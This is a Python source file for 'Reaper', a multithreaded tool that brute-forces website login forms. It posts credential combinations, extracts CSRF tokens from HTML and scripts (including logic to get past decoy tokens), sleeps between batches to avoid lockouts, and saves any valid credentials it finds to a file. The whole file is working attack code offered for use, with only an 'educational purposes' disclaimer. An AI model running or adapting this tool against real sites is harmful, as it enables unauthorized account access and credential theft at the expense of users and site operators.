#!/usr/bin/python3

'''
Reaper is a python3 script which makes http post requests to gather valid credentials from site login forms.

***Reaper was created for educational purposes. Stay away from illegal activities.***

Copyright © 2018 Konstantinos Sarantopoulos

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'''

import sys,requests,re,time,os,threading,queue,arguments
from bs4 import BeautifulSoup as Soup

#---class section---
class mythread (threading.Thread):
	#initialize mythread subclass
	def __init__(self, name, Q, urlQ):
		#invoke the base class (Thread) constructor
		threading.Thread.__init__(self)
		self.Q = Q
		self.urlQ = urlQ
	#the functions that each thread runs when started
	def run(self):
		print(self.name, "started")
		#call the process function
		process(self.name, self.Q, self.urlQ)
		print("Exit", self.name)
		#append the thread which finished to the threads list
		threads.append(self.name)
		#call the finish function
		finish()

#---function section---
def process(threadName, Q, urlQ):
	#check if the Q queue is empty
	while not Q.empty():
		#check if there are more than 1 url in the urlQ
		if urlQ.qsize() > 1:
			#get a url from the urlQ
			url = urlQ.get()
			#do for every item in the parameters list
			for i in parameters_list:
				#check if sleeping is set
				if time_to_sleep != 0:
					#check if the thread should sleep
					if parameters_list.index(i) != 0 and parameters_list.index(i) % int(number_of_tries) == 0:
						print(threadName, "sleeping for", time_to_sleep, "seconds")
						time.sleep(int(time_to_sleep))
						print(threadName, "awake")
				print(threadName, "processing item %s url: %s" % (parameters_list.index(i) + 1, url))
				#call the parametersfunc function
				parametersfunc(threadName, i, url)
		else:
			#if there is one url in the urlQ
			if urlQ.qsize() == 1:
				#get the url from the urlQ
				url = urlQ.get()
				#put url back in urlQ so other threads can use it
				urlQ.put(url)
			#check if sleeping is set
			if time_to_sleep != 0:
				#lock here so the other threads can't continue and have to wait for your sleep
				lock.acquire()
				global t
				#check if the thread should sleep
				if t != 0 and t % int(number_of_tries) == 0:
					#check if Q is empty so not to sleep unnecessarily
					if Q.empty():
						lock.release()
						return
					t += 1
					print(threadName, "sleeping for", time_to_sleep, "seconds")
					time.sleep(int(time_to_sleep))
					print(threadName, "awake")
					lock.release()
				else:
					t += 1
					lock.release()
			#wait until the flag is true (if true return immediately)
			event.wait()
			#set the flag to false so that the other threads wait for this thread to check if Q is empty
			event.clear()
			#check again if Q is empty
			if Q.empty():
				#set the flag to true so the other threads can continue
				event.set()
				#return from the function
				return
			else:
				#get the parameters from the Q
				parameters = Q.get()
			#set the flag to true so the other threads can continue
			event.set()
			global creds_index
			print(threadName, "processing item %s url: %s" % (creds_index, url))
			creds_index += 1
			#call the parametersfunc function
			parametersfunc(threadName, parameters, url)

def parametersfunc(threadName, p, url):
	#set some variables
	parameters = {}
	#make the parameters a list
	parameters_list = p.split("/")
	#make parameters list a dictionary (needed from the requests module)
	for i in range(0,len(parameters_list)):
		para = parameters_list[i].split("=")
		parameters[para[0]] = para[1]
	#make a url get request to get the cookies and the csrf token
	req = requests.get(url)
	#extract the cookies
	cookie = req.cookies
	#extract the csrf token and add it to parameters
	#if the csrf token is embedded in the HTML:
	for key, value in parameters.items():
		if value == "TOKEN":
			html = req.text
			soup = Soup(html, 'lxml')
			try:
				csrf_token = soup.find_all(attrs={ "name" : key })[0].get('value')
			except IndexError:
				return
			else:
				#replace TOKEN with the csrf_token
				parameters[key] = csrf_token
	#if the csrf token is in a script:
	for key, value in parameters.items():
		if value == "SCRIPT":
			html = req.text
			csrf_token = ""
			try:
				#search the html text for the csrf_token
				re.search(key + ".*?value.*?=.*?\w.*?;", html)
			except IndexError:
				return
			else:
				#find all accounts of csrf_token in the html text (there might be more than one if
				#the site has included more as comments)
				csrf_token1 = re.findall(key + ".*?value.*?=.*?\w.*?;", html)
				#if there are comments to fool Reaper
				if len(csrf_token1) > 1:
					#make a second get request
					req = requests.get(url)
					#extract the cookies again cause they change with each request
					cookie = req.cookies
					html = req.text
					#find all the accounts of csrf_token in the html text again
					csrf_token2 = re.findall(key + ".*?value.*?=.*?\w.*?;", html)
					#cross-check the results and remove those which are the same
					for i in csrf_token1:
						for j in csrf_token2:
							if i == j:
								csrf_token1.remove(i)
				#token should be a list with 2 items (the csrf_token is included in the 2nd item)
				token = str(csrf_token1).split("=")
				try:
					token[1]
				except IndexError:
					return
				else:
					#get only the alphanumeric characters from the token
					for i in token[1]:
						if i.isalnum():
							csrf_token += i
				#replace TOKEN with the csrf_token
				parameters[key] = csrf_token
	#make the post request and parse the results
	req = requests.post(url, cookies=cookie, data=parameters)
	#find and write into a file any successful attempts
	#second_way: check if the same parameters exist in the page served after the request
	try:
		second_way
	except NameError:
		pass
	else:
		html = req.text
		soup = Soup(html, 'lxml')
		for key, value in parameters.items():
			try:
				soup.find_all(attrs={ "name" : key })[0]
			except IndexError:
				print ("Found valid credentials: %s , %s" % (url, parameters))
				global pas2
				#write the successful attempts in the file
				pas2 = open(save,'a')
				pas2.write('%s\n' % (parameters))
				pas2.close()
				return
			else:
				return
	#default way: check the url of the page served after the request
	if req.url == (url + "/") or req.url == url or req.url == page:
		pass
	else:
		print ("Found valid credentials: %s , %s" % (url, parameters))
		global pas
		#write the successful attempts in the file
		pas = open(save,'a')
		pas.write('%s\n' %(parameters))
		pas.close()

def finish():
	#check if all the threads finished
	if len(threads) == len(threadList):
		print("All threads exited")
		try:
			pas
		except NameError:
			try:
				pas2
			except NameError:
				print("No valid credentials found")
			else:
				print('The valid credentials have been stored to ' + save)
		else:
			print('The valid credentials have been stored to ' + save)

#---pass the parameters to and get the variables we need from functions.py---
save, url, parameters_list, number_of_tries, time_to_sleep, page, second_way, threadList = arguments.arguments(*sys.argv)

#---declare the variables and start the threads---
threads = []
t = 0
creds_index = 1
lock = threading.Lock()
Q = queue.Queue()
urlQ = queue.Queue()
event = threading.Event()
#set the flag to true
event.set()

#fill the Q
for i in parameters_list:
	Q.put(i)
print("\nNumber of credential combinations:", Q.qsize())

#fill the urlQ
for i in url:
	urlQ.put(i)
print("Number of urls:", urlQ.qsize())

print ("Starting threads...")

#create the threads
for tName in threadList:
	thread = mythread(tName, Q, urlQ)
	thread.start()
